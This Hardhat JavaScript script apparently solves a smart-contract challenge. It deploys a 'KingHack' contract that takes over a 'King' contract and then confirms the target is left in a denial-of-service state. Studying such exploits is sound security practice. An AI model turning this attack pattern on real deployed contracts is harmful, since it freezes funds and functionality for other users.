const { assert } = require("console");
const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config({ path: ".env" });

CONTRACT_NAME = "King"

async function getContract(wallet) {
  const factory = await hre.ethers.getContractFactory(CONTRACT_NAME);
  let contract = null;
  if(hre.network.name == "hardhat") {
    contract = await factory.deploy();
    await contract.deployed();
  }
  else {
    contract = factory.attach(process.env.CONTRACT_ADDRESS);
  }
  return contract.connect(wallet);
}

async function giveWalletMoney(hacker) {
  assert(hre.network.name == "hardhat");
  const [owner] = await ethers.getSigners();
  const trans = await owner.sendTransaction({
    to: hacker.address,
    value: ethers.utils.parseEther("0.1"),
  });
  await trans.wait()
}

async function main() {
  console.log("network name:", hre.network.name);
  const hacker = new ethers.Wallet(process.env.PRIVATE_KEY, hre.ethers.provider);
  contract = await getContract(hacker);
  if(hre.network.name == "hardhat") {
    console.log("getting some eth")
    giveWalletMoney(hacker);
  }

  console.log("hacking contract:", contract.address);

  const sendValue = (await contract.prize()).add(1);
  const attackerFactory = await hre.ethers.getContractFactory("KingHack", hacker);
  let hackContract = await attackerFactory.deploy({value: sendValue});
  await hackContract.deployed();
  console.log("hack contract deployed", hackContract.address);
  await (await hackContract.attack(contract.address)).wait();

  console.log("hack attempt", await contract._king(), await contract.prize())

  const sendValue2 = (await contract.prize()).add(1);
  try {
    await (await hacker.sendTransaction({
      to: contract.address,
      value: sendValue2,
    })).wait();
    console.log("oh no we failed :(", await contract._king(), await contract.prize());
  }
  catch(err) {
    console.log("contract dosed :)", await contract._king(), await contract.prize());
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});